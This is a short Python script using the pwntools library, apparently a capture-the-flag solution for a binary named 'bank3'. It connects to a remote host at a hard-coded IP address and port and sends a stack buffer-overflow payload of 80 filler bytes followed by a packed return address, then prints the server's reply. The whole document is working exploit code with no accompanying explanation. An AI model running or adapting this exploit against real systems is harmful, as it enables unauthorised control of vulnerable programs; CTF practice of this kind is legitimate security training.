from pwn import *

#io = process('./bank3')
io = remote('61.28.237.24', 30204)

payload = b'A'*80+p32(0x08048506)

print(io.recvuntil(': '))
io.sendline(payload)
print(io.recvall())
